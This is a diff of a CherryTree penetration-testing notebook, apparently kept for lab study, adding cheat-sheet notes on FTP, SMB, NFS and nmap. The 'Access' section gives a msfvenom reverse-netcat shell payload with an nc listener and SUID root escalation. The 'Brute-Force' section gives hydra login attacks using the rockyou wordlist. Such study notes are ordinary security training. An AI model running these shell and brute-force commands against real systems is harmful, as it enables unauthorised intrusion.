@@ -169,12 +169,15 @@ Directory :
 
 </rich_text>
     </node>
-    <node name="Linux basics" unique_id="32" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1695325614" ts_lastsave="1695331540">
+    <node name="Linux basics" unique_id="32" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1695325614" ts_lastsave="1696622167">
       <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 list in tree view
 tree -L </rich_text>
       <rich_text weight="heavy">LAYERS</rich_text>
       <rich_text>
+
+ssh:
+id_rsa file as ID needs chmod 600
 
 </rich_text>
     </node>
@@ -201,34 +204,6 @@ telnet </rich_text>
 tcp connection. For example HTTP:
 GET / HTTP/1.1
 host: x
-
-</rich_text>
-    </node>
-    <node name="FTP" unique_id="47" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="" ts_creation="1696095182" ts_lastsave="1696095316">
-      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-ftp </rich_text>
-      <rich_text weight="heavy">IP</rich_text>
-      <rich_text> </rich_text>
-      <rich_text weight="heavy">PORT</rich_text>
-      <rich_text>
-
-user = anonymous
-
-list files:
-</rich_text>
-      <rich_text indent="1">ls</rich_text>
-      <rich_text>
-
-download file:
-</rich_text>
-      <rich_text indent="1">get </rich_text>
-      <rich_text indent="1" weight="heavy">NAME</rich_text>
-      <rich_text>
-
-exit connection:
-</rich_text>
-      <rich_text indent="1">exit</rich_text>
-      <rich_text>
 
 </rich_text>
     </node>
@@ -690,7 +665,7 @@ ACK ping (RST means live host)
 
 </rich_text>
       </node>
-      <node name="Services &amp; Ports" unique_id="25" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="1695242135" ts_lastsave="1696529315">
+      <node name="Services &amp; Ports" unique_id="25" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="1695242135" ts_lastsave="1696969385">
         <rich_text>Multiple Targets:
 </rich_text>
         <rich_text indent="1">10.11.12.15-20
@@ -720,6 +695,11 @@ scan with service detection
 </rich_text>
         <rich_text indent="1">nmap  -sV </rich_text>
         <rich_text indent="1" weight="heavy">TARGET</rich_text>
+        <rich_text>
+
+-p- all ports
+-p </rich_text>
+        <rich_text weight="heavy">RANGE</rich_text>
         <rich_text>
 
 --top-ports </rich_text>
@@ -1233,7 +1213,7 @@ masscan -p</rich_text>
     <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
     <rich_text>
 </rich_text>
-    <node name="FFUF" unique_id="11" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1695159786" ts_lastsave="1695331559">
+    <node name="FFUF" unique_id="11" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1695159786" ts_lastsave="1696620461">
       <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Fuzz Faster U Fool - v2.0.0-dev
 
@@ -1488,6 +1468,223 @@ The Dark Raver                                                          27/01/20
         <rich_text indent="1">/ </rich_text>
         <rich_text weight="heavy">/WORDLIST</rich_text>
       </node>
+    </node>
+  </node>
+  <node name="FTP" unique_id="50" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696620461" ts_lastsave="1696693655">
+    <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+</rich_text>
+    <node name="Commands" unique_id="51" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="#ffffff" ts_creation="1696620461" ts_lastsave="1696693647">
+      <rich_text>ftp </rich_text>
+      <rich_text weight="heavy">IP</rich_text>
+      <rich_text> </rich_text>
+      <rich_text weight="heavy">PORT</rich_text>
+      <rich_text>
+
+user = anonymous
+
+list files:
+</rich_text>
+      <rich_text indent="1">ls</rich_text>
+      <rich_text>
+
+download file:
+</rich_text>
+      <rich_text indent="1">get </rich_text>
+      <rich_text indent="1" weight="heavy">NAME</rich_text>
+      <rich_text>
+
+exit connection:
+</rich_text>
+      <rich_text indent="1">exit</rich_text>
+      <rich_text>
+
+
+</rich_text>
+    </node>
+  </node>
+  <node name="SMB" unique_id="58" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696693639" ts_lastsave="1696969749">
+    <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+</rich_text>
+    <node name="Commands" unique_id="59" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="#ffffff" ts_creation="1696693639" ts_lastsave="1696693639">
+      <rich_text>SMB enumeration:
+</rich_text>
+      <rich_text indent="1">enum4linux </rich_text>
+      <rich_text indent="1" weight="heavy">OPTIONS</rich_text>
+      <rich_text indent="1"> </rich_text>
+      <rich_text indent="1" weight="heavy">IP</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">-U             get userlist
+-M             get machine list
+-N             get namelist dump (different from -U and-M)
+-S             get sharelist
+-P             get password policy information
+-G             get group and member list
+-a             all of the above (full basic enumeration)</rich_text>
+      <rich_text>
+
+smbclient //</rich_text>
+      <rich_text weight="heavy">IP</rich_text>
+      <rich_text>/</rich_text>
+      <rich_text weight="heavy">SHARE</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="1">-U </rich_text>
+      <rich_text indent="1" weight="heavy">USERNAME</rich_text>
+      <rich_text indent="1">
+-p </rich_text>
+      <rich_text weight="heavy">PORT</rich_text>
+      <rich_text>
+
+user Anonymous
+
+</rich_text>
+    </node>
+  </node>
+  <node name="NFS" unique_id="60" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696969749" ts_lastsave="1696969764">
+    <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+</rich_text>
+    <node name="Commands" unique_id="61" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="#ffffff" ts_creation="1696969749" ts_lastsave="1696965877">
+      <rich_text>commands (/usr/sbin/):
+</rich_text>
+      <rich_text indent="1">ockd
+statd
+showmount
+nfsstat
+gssd
+idmapd
+mount.nfs</rich_text>
+      <rich_text>
+
+Mount a share:
+</rich_text>
+      <rich_text indent="1">sudo mount -t nfs </rich_text>
+      <rich_text indent="1" weight="heavy">IP</rich_text>
+      <rich_text indent="1">:</rich_text>
+      <rich_text indent="1" weight="heavy">SHARE</rich_text>
+      <rich_text indent="1"> </rich_text>
+      <rich_text indent="1" weight="heavy">DEST_DIR</rich_text>
+      <rich_text indent="1"> -nolock
+</rich_text>
+      <rich_text indent="2">-t nfs	Type of device to mount, then specifying that it's NFS
+-nolock	Specifies not to use NLM locking</rich_text>
+      <rich_text>
+
+Unmount a share:
+</rich_text>
+      <rich_text indent="1">sudo umount -fl </rich_text>
+      <rich_text indent="1" weight="heavy">IP</rich_text>
+      <rich_text indent="1">:</rich_text>
+      <rich_text indent="1" weight="heavy">SHARE</rich_text>
+      <rich_text indent="1">
+</rich_text>
+      <rich_text indent="2">-f  force
+-</rich_text>
+      <rich_text>l  lazy
+
+List active mounts:
+</rich_text>
+      <rich_text indent="1">df</rich_text>
+      <rich_text>
+
+list NFS shares
+</rich_text>
+      <rich_text indent="1">/usr/sbin/showmount -e IP</rich_text>
+    </node>
+  </node>
+  <node name="Access" unique_id="54" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696624665" ts_lastsave="1696626155">
+    <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+    <node name="Commands" unique_id="55" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="#ffffff" ts_creation="1696624665" ts_lastsave="1696971492">
+      <rich_text>telnet</rich_text>
+      <rich_text indent="1"> </rich_text>
+      <rich_text indent="1" weight="heavy">IP</rich_text>
+      <rich_text> </rich_text>
+      <rich_text weight="heavy">PORT</rich_text>
+      <rich_text>
+
+test if system executes the commands:
+</rich_text>
+      <rich_text indent="1">start ping listener:
+</rich_text>
+      <rich_text indent="2">sudo tcpdump ip proto \\icmp -i tun0</rich_text>
+      <rich_text indent="1">
+execute ping:
+</rich_text>
+      <rich_text indent="2">.RUN ping </rich_text>
+      <rich_text indent="2" weight="heavy">IP</rich_text>
+      <rich_text indent="2"> -c 1</rich_text>
+      <rich_text>
+
+shell access:
+</rich_text>
+      <rich_text indent="1">generate revershell payload:
+</rich_text>
+      <rich_text indent="2">msfvenom -p cmd/unix/reverse_netcat lhost=</rich_text>
+      <rich_text indent="2" weight="heavy">IP</rich_text>
+      <rich_text indent="2"> lport=</rich_text>
+      <rich_text indent="2" weight="heavy">PORT</rich_text>
+      <rich_text indent="2"> R</rich_text>
+      <rich_text indent="1">
+start netcat listener:
+</rich_text>
+      <rich_text indent="2">nc -lvp </rich_text>
+      <rich_text indent="2" weight="heavy">PORT</rich_text>
+      <rich_text>
+
+running executable as root with SUID bit:
+</rich_text>
+      <rich_text indent="1">change file owner to root:
+</rich_text>
+      <rich_text indent="2">sudo chown root </rich_text>
+      <rich_text indent="2" weight="heavy">FILE</rich_text>
+      <rich_text indent="1">
+set SUID-bit:
+</rich_text>
+      <rich_text indent="2">sudo chmod +s </rich_text>
+      <rich_text indent="2" weight="heavy">FILE</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="1">check with ls -l -&gt; ‘s’</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="1">execute file with SUID:
+</rich_text>
+      <rich_text indent="2">./</rich_text>
+      <rich_text indent="2" weight="heavy">FILE </rich_text>
+      <rich_text indent="2">-p</rich_text>
+    </node>
+  </node>
+  <node name="Brute-Force" unique_id="56" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696626155" ts_lastsave="1696626166">
+    <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+    <node name="Login" unique_id="57" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="#ffffff" ts_creation="1696626155" ts_lastsave="1696968015">
+      <rich_text>Hydra:
+hydra -t </rich_text>
+      <rich_text weight="heavy">#CONNECTIONS</rich_text>
+      <rich_text> -l </rich_text>
+      <rich_text weight="heavy">USERNAME</rich_text>
+      <rich_text> -P </rich_text>
+      <rich_text weight="heavy">WORDLIST</rich_text>
+      <rich_text> -vV </rich_text>
+      <rich_text weight="heavy">IP</rich_text>
+      <rich_text> </rich_text>
+      <rich_text weight="heavy">PROTOCOL</rich_text>
+      <rich_text>
+hydra -t </rich_text>
+      <rich_text weight="heavy">#CONNECTIONS</rich_text>
+      <rich_text> -l </rich_text>
+      <rich_text weight="heavy">USERNAME</rich_text>
+      <rich_text> -P </rich_text>
+      <rich_text weight="heavy">WORDLIST</rich_text>
+      <rich_text> -vV </rich_text>
+      <rich_text weight="heavy">PROTOCOL</rich_text>
+      <rich_text>://</rich_text>
+      <rich_text weight="heavy">IP</rich_text>
+      <rich_text>
+/usr/share/wordlists/rockyou.txt</rich_text>
     </node>
   </node>
   <node name="Metasploit" unique_id="29" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1695324968" ts_lastsave="1695332170">
@@ -1772,5 +1969,9 @@ unsetg</rich_text>
 </rich_text>
     </node>
   </node>
-  <node name="Notes" unique_id="46" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1696093389" ts_lastsave="1696530140"/>
+  <node name="Notes" unique_id="46" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1696093389" ts_lastsave="1696969434">
+    <rich_text>
+
+</rich_text>
+  </node>
 </cherrytree>
